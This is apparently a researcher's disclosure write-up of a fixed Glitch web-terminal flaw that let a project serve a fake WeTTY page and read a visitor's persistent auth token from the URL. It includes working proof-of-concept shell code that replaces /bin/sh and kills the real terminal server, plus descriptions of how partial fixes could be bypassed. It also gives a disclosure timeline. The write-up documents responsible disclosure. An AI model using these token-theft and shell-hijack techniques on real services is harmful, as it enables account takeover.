---
date: Sat Aug 19 2023 20:12:28 -0700 (Pacific Daylight Time)
qualitative_time: 
title: Replacing WeTTY on Glitch
previous_teaser: The four modalities squeezing toothpaste out of a tube as it depletes and the paradoxical emergence of complexity in enterprises that ought to be waning 
previous_first: true
has_highlighting: true
---
Two years ago, I discovered a vulnerability in Glitch's web terminal that allowed an attacker to steal a user's authentication tokens when the user visits a specially crafted URL.
This issue is now fixed.

I reported this finding to the Glitch team.
Glitch does not have a program for rewarding security reports, but they've sent me stickers.
🎏
During the reporting of this vulnerability, Glitch was acquired by Fastly.
Fastly has [a program that offers a t-shirt](https://www.fastly.com/security/report-security-issue/), but the program does not cover Glitch.

## Vulnerability overview

- The project terminal page had a URL like `https://glitch.com/edit/console.html?<project domain>`.
  This page would load the user's persistent token and create an iframe to `https://api.glitch.com/<project domain>/console/<user persistent token>/`.
- Glitch checks the persistent token to do the authentication and access control so that only members of the project can access the terminal.
  For members of the project, the request for this inner page is forwarded from the `api.glitch.com` server to the WeTTY server inside the project's container.
  (During the reporting of this vulnerability, [I asked the WeTTY project](https://github.com/butlerx/wetty/issues/360) about the proper capitalization of "WeTTY.")
- An attacker can run a different server that serves a different HTML page, which is particularly easy with root privileges.
- Although WeTTY isn't supposed to do any authentication, the URL where it's served still bears the user's persistent token.
- A malicious HTML page served instead of the WeTTY client can access that persistent token.
- Although Glitch would stop non-members from accessing the terminal page of someone else's project due to lack of authorization, an attacker can add anyone as a member on the attack project so that they'll be exposed to this attack.

## Sample exploitation

First set up some files.

Here's the "greeter" site (g), which will start the attack.
It has a page that uses an iframe to open the terminal page for the project.
We'll set up a `package.json` file so Glitch will run the server for us.

```sh
mkdir -p /app/g
cat >/app/g/index.html <<EOF
<iframe src="https://glitch.com/edit/console.html?$PROJECT_DOMAIN"></iframe>
EOF

cat >/app/package.json <<'EOF'
{
  "scripts": {
    "start": "cd g && python3 -m http.server $PORT"
  },
  "engines": {
    "node": ">=10"
  }
}
EOF
```

Here's the fake terminal (t) site that we'll serve instead of the WeTTY client.
The victim's persistent token will be in the URL accessed via `location.href`, and this sample alerts it.
We also create a script that'll serve it.
A program called "watcher" that runs WeTTY and forwards traffic to it looks for a certain message to see when WeTTY has started listening, so we print that out too for compatibility.

```sh
mkdir -p /app/t
cat >/app/t/index.html <<'EOF'
<script>
  alert('hi from ' + location.href);
</script>
EOF

cat >/app/wetty <<'EOF'
#!/bin/dash
echo 'http 1084'
cd /app/t
python3 -m http.server 1084
EOF
chmod +x /app/wetty
```

Now we need to do something to replace the real WeTTY.
It's easy to do as root, although not entirely straightforward.
We can't edit the WeTTY installation nor the watcher program that runs it, nor the Node.js interpreter that runs them, because they're from read-only mounts, which "root" in the container doesn't actually have permission to re-mount.
But it turns out that the watcher program runs WeTTY through a shell script.
So the next easiest thing to do is to replace the shell interpreter, `/bin/sh`, from the writable overlayfs.

We write a custom implementation of `/bin/sh` (`/bin/dash` is a normal shell; `/bin/sh` is normally a symlink to that).

```sh
cat >/app/sh <<'EOF'
#!/bin/dash
if [ "$1" = /opt/nvm/versions/node/v10/bin/wetty ]; then
  exec /app/wetty
fi
exec dash "$@"
EOF
chmod +x /app/sh
```

Then swap in the fake `/bin/sh` and kill the real WeTTY server, as root:

```sh
su -c 'ln -sf /app/sh /bin/sh && pkill -x wetty'
```

Then when you open the attack page, it will load the fake terminal page and alert the user's persistent token.

## Glitch's fix

Glitch made three changes that fixed this vulnerability.

First, they changed the authentication for the terminal to use a new "single purpose" terminal token instead of the account's persistent token.
These sound like they are shorter lived and only grant access to access the terminal of a single project.
However, a modification of the attack could create another frame with the terminal of any other of the victim's projects and use cross-frame same-origin (`https://api.glitch.com`) scripting to steal other terminal tokens.

Second, they changed the terminal system to serve the WeTTY client from a separate source, rather than from the project container.
However, WeTTY uses socket.io, and requests to `https://api.glitch.com/console/<terminal token>/socket.io/` still get forwarded to the project container.
An attacker could direct a victim to the fake WeTTY server through a `socket.io/` URL containing the attacker's own terminal token.

Third, they forced any responses served from the project container in `https://api.glitch.com/console/<terminal token>/socket.io/` to have the `Content-Type` header set to `text/plain`, plus that one header that prevents content type sniffing.
And that one's good.
I consider this fixed.

Actually there was one more fix they made to address this.
Zeroth, they made some progress on fixing privilege escalation vulnerabilities, fixing [a couple related to Git project import](/2021/10/10/glitch-git-import.html).

## Would this attack have been possible without root?

I'm convinced that it would have, although I wasn't aware of how when I initially reported it.
I recently heard that Glitch user [@hello-smile6](https://glitch.com/@hello-smile6) was able to run an entire replacement watcher program without root privilege.
This would have made it possible to serve the attack page from a fake WeTTY server without root privilege.

## Timeline, the first few months

**2021/05/24**
I find this vulnerability which allows an attacker to steal a user's "persistent" authentication token.

**2021/05/25**
I report the vulnerability with sample exploitation code.
At the time, I think that exploiting this vulnerability needs root.

**2021/05/26**
Glitch support says "As soon as [the Glitch team] give me an update about this, I will let you know. ...
They typically review [a vulnerability report] within the same week and then make an assessment to determine priority-level and who will investigate it further/fix it."

**2021/09/29**
Although there's no notice from Glitch, I find that they have applied the first fix, changing the terminal to use a single purpose token.
I only find out because I have been maintaining my own software for connecting to the terminal, and [this change broke it](https://github.com/wh0/snail-cli/issues/16).
I'm still worried about attacker-supplied content served from the `https://api.glitch.com` origin, i.e. XSS, but the specific vulnerability is fixed.
I ask if I can disclose.

**2021/09/30**
Glitch support confirms that this vulnerability fixed.

**2021/10/05**
While working on a precursor to this article, I further develop my concerns about XSS into the modified attack that steals other projects' terminal tokens through cross-frame scripting.
I leave the article unpublished, and I report this modified attack, with only pseudocode.

**2021/10/07**
Glitch support says the team believes the modified attack would not work.
They provide no explanation of why, so I work on completing the sample exploit to see what prevents it.

I find out that they have applied the second fix, serving the WeTTY client separately.
However, I find that requests to the `socket.io/` path still go to the project container and that the container can still serve the attack page.
I further modify the attack to be served from this path and confirm that it works.
I report the `socket.io/` modification and my success at testing the attack.

**2021/10/08**
Glitch support asks for reproduction steps, and I forward the modified fake WeTTY server with the new `socket.io/` path and cross-frame scripting code.
But their request for info turns out not to be about the modifications to the fake WeTTY server.

## October 2021
Following my reply with the modified code, they ask how I'm still able to get root access.

That's why this particular date has shown up in multiple previous posts about root privilege escalation vulnerabilities (since disclosed: [OT rm](/2021/11/10/glitch-ot-rm.html) and [git import](/2021/10/10/glitch-git-import.html)).
It's because I took this opportunity to check on the status of my other ongoing reports.

I check if the vulnerabilities that I reported earlier are still reproducible, and I thus find out that they have applied the zeroth fix, fixing a few of those earlier vulnerabilities.
We'll be seeing this date a couple more times in the future too.

At this point though, it's sufficiently clear that I am not getting updates about Glitch's fixes.
There have been multiple reports that went without notification of a fix, and there have been at least three incomplete fixes for this vulnerability deployed so far with not a word from Glitch until I'd bring it up myself.

I'm working on not taking transparency for granted, but this time they had specifically told me that they would be giving updates, so I bug them about this.

They reply,
"a bunch of them were fixes as part of other fixes from other reports, which is likely why there have been no direct updates."
Unfortunately, I read that to mean
"Other people also reported these vulnerabilities, and
we're fixing things for those other reporters, not for you.
We're sending updates to them, and
we're not sending any to you.
That's why you don't get any updates from us."
And I tried to finish up the conversation, but that hurt.

For a long time, I was discouraged.

## Timeline, later years

**2022/05/25**
Glitch has just been acquired by Fastly.
It's also been a year since I reported this.
I ask them about it again, if I can just disclose it.

**2022/05/26**
Glitch's reply is (1) brb onboarding at Fastly and
(2) what were we even worried about again?

I go ahead and try the attack again to see if it's fixed, which it is.
I find out that Glitch had applied the third fix: to force responses from the WeTTY server to be plain text, which I believe fixes the vulnerability.

I send a recap of this report and mention this latest fix.
They want some time to respond, and they forward my latest info to the team.
But then there's no response.

**2023/07/27**
@hello-smile6 experiments with replacing the watcher program, succeeding.
That reminds me of this report, so I bring it up again with Glitch support.

**2023/08/04**
We agree that the vulnerability is fixed.

**2023/08/19**
I publish this article.
